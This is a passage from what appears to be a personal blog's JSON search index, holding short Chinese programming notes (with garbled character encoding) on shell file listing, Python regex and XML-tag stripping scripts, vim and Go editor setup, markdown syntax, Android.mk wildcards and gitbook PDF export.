\n\t\t\tif [ \"$DIR\" != \"\" ] && [ ${DIR:0:6} = \"./base\" ];then\n\t\t\t\tcontinue #æ­¤å¤„å¯ä»¥è¿‡æ»¤ä¸æƒ³è¦çš„æ–‡ä»¶å¤¹\t\n\t\t\tfi\n\t\t\tFILE=$DIR$file\n\t\t\tif [ -f $FILE ]; then\n\t\t#\t\techo \"===================== $file begin =====================\" >> $NAME\n\t\t#\t\t`cat $FILE >> $NAME`\n\t\t#\t\techo \"===================== $file end =====================\" >> $NAME\n\t\t\t\techo $FILE\n\t\t\tfi\n\t\tfi\n\tfi\ndone\n```\n","tags":["shell"],"categories":["å‘½ä»¤"]},{"title":"pythonä½¿ç”¨æ­£åˆ™åå‘å¼•ç”¨æ›¿æ¢å­—ç¬¦ä¸²","url":"%2Fp%2F136fd428.html","content":">å·¥ä½œéœ€è¦æŠŠ `Mud makes my mom mad.` è¿™å¥è¯å¸¦æœ‰mçš„åŠ ä¸Šé¢œè‰²,æˆ–è€…æŠŠæŸäº›å•è¯åŠ ä¸Šé¢œè‰²\n>ä¸´æ—¶å†™äº†ä¸ªè„šæœ¬å¤„ç†\n\n```python\nimport re\nimport sys\n\n\n# replace letter\n#find = \"m\"\n#str = \"Mud makes my mom mad.\"\n\n#replace key words\n#find = \"Mud|makes|mad\"\n#str  = \"Mud makes my mom mad.\"\n\n# how to use\n# python b.py \"m\"\t\"Mud makes my mom mad.\" \n# python b.py \"mud|mess|mop|make|the|help\"\t\"Mud makes my mom mad.\"\n\n\nfind  = sys.argv[1] \nstr   = sys.argv[2] \n\n\nresult = re.sub(r'('+find+')', r'<color:#ff0000>\\1</color>', str, 0, re.IGNORECASE)\nprint result\n\n```\n","tags":["python"],"categories":["python"]},{"title":"macç³»ç»Ÿvimå‡çº§æµç¨‹","url":"%2Fp%2F4ea69092.html","content":"\n#### æ‰§è¡Œå‘½ä»¤å®‰è£…vim æ³¨æ„è¦åŠ ä¸Š`--with-override-system-vi`\n```bash\nbrew install vim --with-override-system-vi\n```\n\n\n#### å®‰è£…è¿‡ç¨‹ä¸­å¦‚æœå‡ºç° ruby.hæ‰¾ä¸åˆ°\n\næ‰§è¡Œä¸‹é¢çš„å‘½ä»¤\n\n```bash\ncd /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.11.sdk/System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/include/ruby-2.0.0/ruby\n```\n\n```bash\nsudo ln -s ../universal-darwin15/ruby/config.h ./config.h\n```\næ³¨æ„ä¸è¦å¤åˆ¶ä¸Šé¢çš„, å¯¹åº”è‡ªå·±çš„sdkç‰ˆæœ¬,rubyç‰ˆæœ¬,darwinç‰ˆæœ¬\n\n\n<!-- more -->\n#### ç»™è‡ªå·±çš„vimåšä¸ªåˆ«å, æ³¨æ„è‡ªå·±vimçš„ç‰ˆæœ¬è·¯å¾„\n\n```bash\nalias vim=\"/usr/local/Cellar/vim/7.4.2152/bin/vim\"\n```\n\n\n\n#### å‡çº§vimåå¦‚æœä¸»é¢˜ä¸æ˜¾ç¤º\næŠŠè‡ªå·±ä¸»é¢˜æ–‡ä»¶æ”¾åˆ°è¿™ä¸ª `/usr/local/Cellar/vim/7.4.2152/bin/vim`é‡Œ\n\n\n#### è®©gitä¹Ÿé€‚åº”æœ€æ–°çš„vim\n\n```bash\ngit config --global core.editor /usr/local/Cellar/vim/7.4.2152/bin/vim\n```\n\n\n--------\n\n## å¦å¤–ä¸€ç§æ–¹æ¡ˆ, å®‰è£…macvim\n\nInstall the latest version of MacVim. Yes, MacVim. And yes, the latest.\n\nIf you don't use the MacVim GUI, it is recommended to use the Vim binary that is inside the MacVim.app package (MacVim.app/Contents/MacOS/Vim). To ensure it works correctly copy the mvim script from the MacVim download to your local binary folder (for example /usr/local/bin/mvim) and then symlink it:\n\n\n\n```\nalias vim=\"/Applications/MacVim.app/Contents/MacOS/Vim\"\ngit config --global core.editor /Applications/MacVim.app/Contents/MacOS/Vim\n```\n\nIt requires Vim 7.3.885 or later with Lua support (\"+lua\").\n```\nbrew install macvim --with-lua\n```\n","tags":["vim"],"categories":["è½¯ä»¶"]},{"title":"golangé…ç½®vim","url":"%2Fp%2F3feff448.html","content":"### é…ç½®æ–‡ä»¶å’Œå¿«é€Ÿè®¾ç½®\n- [.vimrc][1]\n- [.zhsrc][2]\n[1]: https://github.com/unix2dos/go-tutorial/blob/master/.vimrc\n[2]: https://github.com/unix2dos/go-tutorial/blob/master/.zshrc\n\n1. PlugClean\n2. PlugInstall\n3. å»åˆ°YCMé‡Œæ‰§è¡Œ\n```\n./install.py --clang-completer --gocode-completer\n```\n\n\n### å®‰è£…æ’ä»¶ç®¡ç†å™¨\n```bash\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n```\n\n### å®‰è£…æ’ä»¶\n```bash\ncall plug#begin()\nPlug 'fatih/vim-go' \"go\nPlug 'tomasr/molokai' \"ä¸»é¢˜\nPlug 'SirVer/ultisnips' \"tabè¡¥å…¨\nPlug 'ctrlpvim/ctrlp.vim' \"å¿«é€ŸæŸ¥æ–‡ä»¶\nPlug 'Shougo/neocomplete.vim' \"å®æ—¶æç¤º\nPlug 'majutsushi/tagbar' \"tagbar\nPlug 'scrooloose/nerdtree' \"å¯¼èˆª\nPlug 'vim-airline/vim-airline' \"ä¸‹é¢\ncall plug#end()\n```\n<!-- more -->\n\n###  å®‰è£…go toolséœ€è¦çš„ä¸œè¥¿ï»¿\nç›´æ¥ä½¿ç”¨`:GoInstallBinaries`å®‰è£…\nå¦‚æœç½‘ç»œä¸è¡Œ(ä½ æ‡‚çš„), æŠŠä»£ç†æŠŠåŒ…éƒ½ä¸‹è½½ä¸‹æ¥\n\n```bash\ngit clone https://go.googlesource.com/tools  \n```\n\n\n### goTagséœ€è¦å®‰è£…ctags\n\n```bash\nbrew install ctags\n```\nï»¿\n\n### ä»£ç å®æ—¶æç¤ºneocomplete, éœ€è¦vimæ”¯æŒlua\n```bash\nbrew uninstall vim\nbrew install luajit\nbrew install vim --with-luajit\n```\n\n\n### Gocode autocomplete non imported packages\n```\ngocode set unimported-packages true\n```","tags":["golang"],"categories":["3_golangæ‚é¡¹"]},{"title":"pythonè¯»å–æ–‡ä»¶å»é™¤html_xmlæ ‡ç­¾","url":"%2Fp%2Ff3ea3847.html","content":"\n> è‡ªå·±å†™çš„ä¸€ä¸ªç®€å•å»é™¤htmlæ ‡ç­¾(xml)çš„è„šæœ¬\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<text font=\"Palatino Linotype\">\n<p>\n<s end_audio=\"262\" start_audio=\"13\">\n<w end_audio=\"94\" id=\"0\" start_audio=\"13\" variants=\"mud\">Mud</w>\n<w end_audio=\"122\" id=\"1\" start_audio=\"95\">makes</w>\n<w end_audio=\"140\" id=\"2\" start_audio=\"123\">my</w>\n<w end_audio=\"215\" id=\"3\" start_audio=\"141\">mom</w>\n<w end_audio=\"262\" id=\"4\" start_audio=\"216\" variants=\"mad\">mad.</w>\n</s>\n</p>\n</text>\n```\n\n```python\nimport re\nimport sys\n\n# how to use\n# pythone a.py C6M01B1-001.xml\n\nfile = sys.argv[1]\nf = open(file, 'r')\n\nres = \"\"\nfor line in f.readlines():\n\t#str = re.sub(r'</?\\w+[^>]*>','',line)\n\tstr = re.sub(r'<(/|\\?)?\\w+[^>]*>','',line)\n\tif str != '\\r\\n':\n\tres = res + str\n\tres = re.sub('\\r\\n',' ',res)\n\tprint res\n#print \"len =\",len(res)\n```\n","tags":["python"],"categories":["python"]},{"title":"markdownè¯­æ³•é›†åˆ","url":"%2Fp%2F1ef7af3b.html","content":"\n\n> This is a blockquote.\n> \n> This is the second paragraph in the blockquote.\n>\n> ## This is an H2 in a blockquote\n\n\n\nSome of these words *are emphasized*.\n\nUse two asterisks for **strong emphasis**.\t\n\n<!-- more -->\n\t\t\n\t\t\t\t\t\n- Candy.\n- Gum.\n- Booze.\n\n\tâ€‹\t\n1. Red\n2. Green\n3. Blue\n\n\nThis is an [example link](http://example.com/)\n\nI get 10 times more traffic from [Google][1] than from\n[Yahoo][2] or [MSN][a].\n\n[1]: http://google.com/ \"Google\"\n[2]: http://search.yahoo.com/ \"Yahoo Search\"\n[a]: http://search.msn.com/ \"MSN Search\"\n\n\n\n\n![alt text](/images/a.jpg \"Title\")\n\n![alt text][id]\n\n[id]: /images/a.jpg \"Title\"\n\n\nI strongly recommend against using any `<blink>` tags.\n\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86   \n    src=\"http://music.163.com/outchain/player?type=2&id=25706282&auto=0&height=66\">  \n</iframe> \n\n<iframe   \n    height=498 width=510   \n    src=\"http://www.iqiyi.com/v_19rr9nypk0.html\"\n    frameborder=0 allowfullscreen>  \n</iframe>  \n\n\n| Tables        | Are           | Cool  |\n| ------------- |:-------------:| -----:|\n| col 3 is      | right-aligned | $1600 |\n| col 2 is      | centered      |   $12 |\n| zebra stripes | are neat      |    $1 |\n\n","tags":["markdown"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"androidè‡ªåŠ¨æ·»åŠ æ–‡ä»¶åˆ°android-mk","url":"%2Fp%2F99b8fe68.html","content":"\nå°†\n```bash\nLOCAL_SRC_FILES := hellocpp/main.cpp \\  \n                   ../../Classes/AppDelegate.cpp \\  \n                   ../../Classes/HelloWorldScene.cpp \n```\næ¢æˆ\n\n```bash\nFILE_LIST := hellocpp/main.cpp    \nFILE_LIST += $(wildcard $(LOCAL_PATH)/../../Classes/*.cpp)    \nLOCAL_SRC_FILES := $(FILE_LIST:$(LOCAL_PATH)/%=%)   \n```\n\n----\n\n<!-- more -->\n**å¦å¤–ä¸€ç§æ–¹æ³•:**\n\n```bash\n#éå†ç›®å½•åŠå­ç›®å½•çš„å‡½æ•°  \ndefine walk  \n    $(wildcard $(1)) $(foreach e, $(wildcard $(1)/*), $(call walk, $(e)))  \nendef  \n  \n#éå†Classesç›®å½•  \nALLFILES = $(call walk, $(LOCAL_PATH)/../../Classes)  \nFILE_LIST := hellocpp/main.cpp  \n#ä»æ‰€æœ‰æ–‡ä»¶ä¸­æå–å‡ºæ‰€æœ‰.cppæ–‡ä»¶  \nFILE_LIST += $(filter %.cpp, $(ALLFILES))  \nLOCAL_SRC_FILES := $(FILE_LIST:$(LOCAL_PATH)/%=%)\n```\n","tags":["android"],"categories":["android"]},{"title":"gitbook--åˆ¶ä½œpdf","url":"%2Fp%2F1f9c8aa6.html","content":"\n## å‘½ä»¤è¡Œ:\ngitbook pdf Effective-Modern-Cpp-Zh  myname.pdf\n\n\n\n### å¦‚æœæ— æ³•ç”Ÿæˆ éœ€è¦å®‰è£… calibre  \n\nå®‰è£…åè¿˜è¦æ‰§è¡Œå‘½ä»¤\nln -s /Applications/calibre.app/Contents/MacOS/ebook-convert /usr/local/bin\n\n","tags":["others"],"categories":["git"]},{"title":"æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢","url":"%2Fp%2Fd95d7e09.html","content":"\næˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢,å†™ç‚¹ä»€ä¹ˆå¥½å‘¢? \nå¸Œæœ›ä»¥åèƒ½åšæŒå†™ä¸‹å»æŠŠ.\n","tags":["others"],"categories":["åšå®¢"]}]